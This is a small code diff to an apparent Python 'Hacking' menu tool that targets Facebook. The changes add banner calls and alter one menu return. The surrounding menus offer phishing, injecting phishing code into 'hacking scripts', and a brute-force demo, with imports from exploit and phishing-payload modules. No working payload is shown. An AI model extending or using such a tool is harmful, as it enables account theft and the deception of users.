@@ -5,6 +5,7 @@
 from system.clear import *
 
 from src.dialogues.dialog import *
+from arm.banner import *
 from exploit.xploit import *
 
 from payload.facebook.phising.inject.injects import *
@@ -15,6 +16,7 @@ class Hacking:
     def facebook():
         while True:
             Clear()
+            Banner()
             print("""
 Choice Your Methods
   1. Phising
@@ -24,13 +26,14 @@ Choice Your Methods
             if x == "1":
                 Hacking.Phising()
             elif x == "2":
-                Dialog.second()
+                return 1
             else:
                 print("[!] Wrong input!!")
                 time.sleep(2)
     def Phising():
         while True:
             Clear()
+            Banner()
             print("""
 Use Phising Strategies
   1. inject phishing code into the hacking script
@@ -47,6 +50,7 @@ Use Phising Strategies
     def Choice_script_to_be_injected():
         while True:
             Clear()
+            Banner()
             print("""
 Choice Hacking script to be injected
   1. Simple Bruteforce Demo (DEMO)
